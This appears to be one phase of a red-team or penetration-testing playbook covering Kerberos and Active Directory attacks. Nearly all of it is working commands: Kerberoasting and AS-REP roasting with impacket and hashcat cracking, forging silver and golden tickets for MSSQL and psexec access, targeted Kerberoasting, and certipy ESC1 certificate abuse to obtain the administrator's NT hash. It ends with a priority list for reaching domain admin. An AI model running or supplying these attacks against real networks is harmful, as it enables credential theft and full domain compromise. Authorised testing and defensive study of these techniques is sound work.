# Phase 3: Kerberos Attacks

## Gate: Kerberoast/AS-REP completed, tickets cracked or delegation paths identified

## Steps

### 3.1 Kerberoasting (crack service account passwords)
```bash
# Get TGS tickets for SPNs
impacket-GetUserSPNs -dc-ip <DC> DOMAIN/user:pass -request -outputfile kerberoast.txt

# Crack with hashcat (mode 13100 = Kerberos 5 TGS-REP RC4)
hashcat -m 13100 kerberoast.txt wordlist.txt -r rules/best64.rule

# AES tickets (mode 19700) — much harder to crack
hashcat -m 19700 kerberoast_aes.txt wordlist.txt

# Prioritize: RC4 tickets crack in minutes, AES can take days/never
```

### 3.2 AS-REP Roasting (no pre-auth required)
```bash
# Find accounts with DONT_REQUIRE_PREAUTH
impacket-GetNPUsers -dc-ip <DC> DOMAIN/ -usersfile users.txt -no-pass -outputfile asrep.txt

# Crack (mode 18200)
hashcat -m 18200 asrep.txt wordlist.txt -r rules/best64.rule
```

### 3.3 Silver Ticket (forge service ticket)
```bash
# Need: service account NTLM hash + domain SID + SPN
# Use when you cracked a service account but can't access the service directly

impacket-ticketer -nthash <hash> -domain-sid <SID> -domain corp.local \
  -spn MSSQLSvc/sql01.corp.local:1433 -user-id 500 Administrator

export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k -no-pass sql01.corp.local
```

### 3.4 Golden Ticket (forge TGT — requires krbtgt hash)
```bash
# Only after obtaining krbtgt hash (DCSync or ntds.dit)
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain corp.local Administrator

export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass dc01.corp.local
```

### 3.5 Targeted Kerberoast (set SPN on user you control)
```bash
# If you have GenericAll/GenericWrite on a user:
# Set SPN → Kerberoast → Crack → Remove SPN
python3 targetedKerberoast.py -u user -p pass -d corp.local --request-user targetadmin
```

### 3.6 ADCS Exploitation (Certificate Services)
```bash
# Enumerate vulnerable templates
certipy find -u user@corp.local -p 'pass' -dc-ip <DC> -vulnerable -stdout

# ESC1: Template allows requestor to specify SAN (SubjectAltName)
certipy req -u user@corp.local -p 'pass' -ca 'CORP-CA' \
  -template VulnTemplate -upn administrator@corp.local

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip <DC>
# Returns NT hash of administrator

# ESC4: Template owner can modify template → make it ESC1
# ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA
# ESC8: NTLM relay to AD CS HTTP endpoint
```

## Priority Order
1. **ADCS** — often fastest path to DA (ESC1/ESC4 are common)
2. **Kerberoast RC4** — service accounts often have weak passwords
3. **AS-REP Roast** — fewer targets but easy wins
4. **Targeted Kerberoast** — requires write privilege on user object
5. **Silver/Golden ticket** — requires prior compromise (Phase 5 usually)

## Pitfalls
- AES Kerberoast tickets: don't waste GPU time unless password is likely weak
- ADCS ESC1: template must allow enrollment by your user/group — check ACLs
- Silver tickets: only work for the specific SPN forged, not general domain access
- Golden tickets: krbtgt password changes invalidate — note when krbtgt last rotated
